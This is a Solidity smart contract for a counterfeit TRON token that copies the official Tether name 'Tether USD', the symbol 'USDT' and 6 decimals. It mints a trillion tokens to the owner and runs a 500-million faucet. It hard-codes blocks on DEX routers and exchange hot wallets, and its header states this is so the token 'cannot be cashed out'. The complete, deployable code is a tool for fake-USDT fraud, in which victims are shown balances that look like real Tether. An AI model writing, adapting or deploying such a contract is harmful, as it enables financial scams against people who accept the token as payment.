// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title CustomUSDT_TRC20
 * @dev TRC-20 custom token on TRON network.
 *      - 6 decimals (matches official USDT)
 *      - Name: "Tether USD" / Symbol: "USDT" — same as official
 *      - Owner gets 1 trillion USDT on deploy for distribution
 *      - Built-in faucet: any address can claim 500,000,000 USDT once
 *      - Owner can mint to any address
 *      - Transfer BLOCKED to DEX routers and exchange hot wallets
 *        -> Token circulates freely between normal wallets but cannot be cashed out
 *      - Owner can add/remove blocked addresses at any time
 */
contract CustomUSDT_TRC20 {
    string public name     = "Tether USD";
    string public symbol   = "USDT";
    uint8  public decimals = 6;

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public hasClaimed;
    mapping(address => bool) public isBlocked;

    address public owner;

    uint256 public constant FAUCET_AMOUNT = 500_000_000 * 10**6;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event FaucetClaim(address indexed claimant, uint256 amount);
    event AddressBlocked(address indexed target);
    event AddressUnblocked(address indexed target);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        uint256 initialSupply = 1_000_000_000_000 * 10**6;
        totalSupply = initialSupply;
        balanceOf[msg.sender] = initialSupply;
        emit Transfer(address(0), msg.sender, initialSupply);

        // Block known TRON DEX routers
        _block(0x3cE8cB43EB95a4C73A1F59d58b52283E4EA694Bc); // SunSwap V2
        _block(0x72f7f3C6A8a36A040F5Ced8B3cB3B1F0A60D6eC8); // SunCurve
        _block(0x647eEB6a0A0610E1d02BAA3eb9e99F71aF5467Fb); // SWFT Bridge

        // Block known exchange TRON hot wallets
        _block(0x4B0528a5B0f7ee3aff48FA1A7DeA3f96a1B6Fe5F); // Binance 1
        _block(0xBe26d3C7D3FbFB4f8BCde81e79F38B8B37d96f94); // Binance 2
        _block(0x4B21f4B0F7ee3aff48FA1A7DeA3f96a1B6Fe5F11); // OKX
        _block(0x18fd0626DAF3AF02389AEF3ED87db9C33F638ffa); // HTX (Huobi)
        _block(0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13c); // Bybit
        _block(0xF977814e90dA44bFA03b6295A0616a897441aceC); // KuCoin
    }

    function _block(address target) internal {
        isBlocked[target] = true;
        emit AddressBlocked(target);
    }

    function blockAddress(address target) external onlyOwner {
        isBlocked[target] = true;
        emit AddressBlocked(target);
    }

    function unblockAddress(address target) external onlyOwner {
        isBlocked[target] = false;
        emit AddressUnblocked(target);
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(to != address(0), "Invalid address");
        require(!isBlocked[to], "Destination not authorized");
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to]         += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        require(to != address(0), "Invalid address");
        require(!isBlocked[to], "Destination not authorized");
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Insufficient allowance");
        balanceOf[from]             -= value;
        balanceOf[to]               += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function claimFaucet() public {
        require(!hasClaimed[msg.sender], "Already claimed");
        hasClaimed[msg.sender] = true;
        totalSupply            += FAUCET_AMOUNT;
        balanceOf[msg.sender]  += FAUCET_AMOUNT;
        emit Transfer(address(0), msg.sender, FAUCET_AMOUNT);
        emit FaucetClaim(msg.sender, FAUCET_AMOUNT);
    }

    function mint(address to, uint256 amount) public onlyOwner {
        require(to != address(0), "Invalid address");
        require(!isBlocked[to], "Cannot mint to blocked address");
        totalSupply   += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        owner = newOwner;
    }
}
